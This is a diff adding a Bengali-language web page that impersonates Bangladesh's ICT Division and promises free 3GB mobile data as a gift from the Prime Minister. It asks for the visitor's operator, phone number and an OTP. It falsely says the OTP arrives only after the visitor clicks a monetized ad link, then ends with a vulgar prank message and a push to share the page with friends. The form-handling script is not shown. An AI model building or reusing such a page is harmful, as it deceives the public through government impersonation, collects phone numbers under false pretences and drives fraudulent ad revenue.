@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="bn">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>তথ্য প্রযুক্তি বিভাগ</title>
+    <link rel="icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/c/c4/Globe_icon.svg">
+    <meta property="og:title" content="  ৩জিবি ফ্রি ইন্টারনেট!" />
+    <meta property="og:description"
+        content=" সকল সিমে ৩জিবি ডাটা একদম ফ্রি। এখনই আপনার নাম্বার দিয়ে অফারটি সংগ্রহ করুন।" />
+    <meta property="og:image" content="https://www.yourwebsite.com/assets/images/image.jpeg" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://www.yourwebsite.com" />
+
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="assets/style.css">
+
+</head>
+
+<body>
+
+    <nav class="navbar">
+        <a href="#" class="nav-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c4/Globe_icon.svg"
+                alt="govt Logo">
+            <div class="logo-text">
+                <span class="main">তথ্য প্রযুক্তি বিভাগ</span>
+                <span class="sub">ডিজিটাল কানেক্টিভিটি অফার</span>
+            </div>
+        </a>
+        <i class="fas fa-ellipsis-v" style="color: #666;"></i>
+    </nav>
+
+    <div class="hero-area">
+        <div class="hero-badge">
+            <i class="fas fa-check-circle"></i>  অনুমোদিত ক্যাম্পেইন
+        </div>
+        <h1>প্রধানমন্ত্রী উপহার: <span style="color:var(--govt-green)">৩জিবি</span> ফ্রি ডাটা</h1>
+        <p style="color:#718096; font-size: 14px; margin-top: 8px;"> জনাব তারেক রহমানের বিশেষ
+            উপহার।</p>
+    </div>
+
+    <div class="main-card">
+        <label class="step-title">
+            <i class="fas fa-th-large" style="color:var(--govt-green)"></i>
+            ধাপ ১: অপারেটর নির্বাচন করুন
+        </label>
+
+        <div class="operator-grid">
+            <div class="op-card" onclick="selectOp('Grameenphone', this)">
+                <img src="assets/images/gp.png" alt="GP">
+                <span>গ্রামীণফোন</span>
+            </div>
+            <div class="op-card" onclick="selectOp('Banglalink', this)">
+                <img src="assets/images/ba.png" alt="BL">
+                <span>বাংলালিংক</span>
+            </div>
+            <div class="op-card" onclick="selectOp('Robi', this)">
+                <img src="assets/images/ro.png" alt="Robi">
+                <span>রবি (Robi)</span>
+            </div>
+            <div class="op-card" onclick="selectOp('Teletalk', this)">
+                <img src="assets/images/te.png" alt="Teletalk">
+                <span>টেলিটক</span>
+            </div>
+        </div>
+
+        <div id="input-area" class="phone-input-container">
+            <label class="step-title" id="selectedLabel">
+                <i class="fas fa-mobile-alt"></i> ধাপ ২: নম্বর প্রদান করুন
+            </label>
+
+            <div class="input-wrapper">
+                <i class="fas fa-phone-alt input-icon"></i>
+                <input type="tel" id="mobileNumber" class="phone-input" placeholder="01XXXXXXXXX" maxlength="11">
+            </div>
+
+            <div id="responseMessage" class="message-box"></div>
+
+            <button class="submit-btn" id="submitBtn" onclick="submitForm()">
+                ডাটা গ্রহণ করুন <i class="fas fa-arrow-right"></i>
+            </button>
+        </div>
+    </div>
+
+    <div style="margin: 0 15px;">
+        <div class="ad-space">
+            <p style="font-size: 12px; color: #a0aec0;">বিজ্ঞাপন এখানে যুক্ত করুন</p>
+        </div>
+    </div>
+
+    <div id="otp-section" class="main-card animate-fade" style="display: none;">
+        <label class="step-title"><i class="fas fa-shield-alt"></i> ধাপ ৩: যাচাইকরণ</label>
+        <p style="font-size: 14px; margin-bottom: 15px; color: #4a5568;">
+            নম্বর: <strong id="displayNum" style="color:var(--govt-green)"></strong>
+        </p>
+
+        <input type="text" id="otpInput" class="phone-input" placeholder="OTP কোড দিন" maxlength="6"
+            style="margin-bottom: 20px; padding-left: 20px;">
+
+        <div id="ad-instruction"
+            style="background: #fffaf0; padding: 15px; border-radius: 12px; margin-bottom: 20px; border-left: 4px solid #ed8936;">
+            <p style="font-size: 13px; color: #282623; font-weight: 600;">
+                ⚠️ 10 সেকেন্ড বিজ্ঞাপন না দেখলে OTP আসবে না। নিচে বাটন এ ক্লিক করে বিজ্ঞাপন দেখে আসুন
+            </p>
+        </div>
+
+        <a href="https://www.effectivegatecpm.com/s2cvjz65qa?key=f26048bc3e759511003bc0285a21df1b" target="_blank"
+            class="submit-btn" id="adBtn" onclick="startAdProcess()"
+            style="text-decoration: none; display: inline-flex; align-items: center; justify-content: center;">
+            <i class="fas fa-external-link-alt"></i> বিজ্ঞাপন দেখে OTP নিন
+        </a>
+
+        <button class="submit-btn" id="otpSubmitBtn" style="display:none; margin-top: 15px;" onclick="showVideoPopup()">
+            OTP পাঠান <i class="fas fa-check-double"></i>
+        </button>
+
+        <div id="countdown" style="margin-top: 10px; font-weight: bold;"></div>
+
+        <div id="countdown" style="text-align: center; margin-top: 15px; font-weight: bold; color: var(--govt-red);">
+        </div>
+    </div>
+
+    <div id="videoArea">
+        <div class="video-box">
+            <div class="success-icon">
+                <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                    <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none" />
+                    <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" />
+                </svg>
+            </div>
+
+            <div class="content-text">
+                <h2>আপনি সফলভাবে গো*য়া মারা খেয়ে সেন। 😆</h2>
+                <p>আপনি শুধু একাই গো*য়া মারা খাবেন আপনার বন্ধুদের কেউ খাওয়ান। শেয়ার করুন 😉</p>
+            </div>
+
+            <div class="video-wrapper">
+                <video id="successVideo" width="100%" controls>
+                    <source src="assets/videos/WhatsApp Video 2026-02-20 at 11.34.31 PM.mp4" type="video/mp4">
+                </video>
+            </div>
+
+            <button class="submit-btn" onclick="closeVideo()">বন্ধুদের শেয়ার করুন এবং জানুন</button>
+        </div>
+    </div>
+    <footer style="text-align: center; padding: 20px; background: #fff; border-top: 1px solid #eee; margin-top: 60px;">
+        <p style="font-size: 13px; color: #4a5568; margin-bottom: 5px;">
+            © ২০২৬ <strong>তথ্য ও যোগাযোগ প্রযুক্তি বিভাগ</strong>
+        </p>
+        <div style="font-size: 11px; color: #a0aec0;">
+            <a href="#" style="color: #006a4e; text-decoration: none; margin: 0 5px;">শর্তাবলী</a> •
+            <a href="#" style="color: #006a4e; text-decoration: none; margin: 0 5px;">গোপনীয়তা</a> •
+            <a href="#" style="color: #006a4e; text-decoration: none; margin: 0 5px;">সহায়তা</a>
+        </div>
+    </footer>
+
+
+    <script src="assets/script.js"></script>
+
+
+</body>
+
+</html>
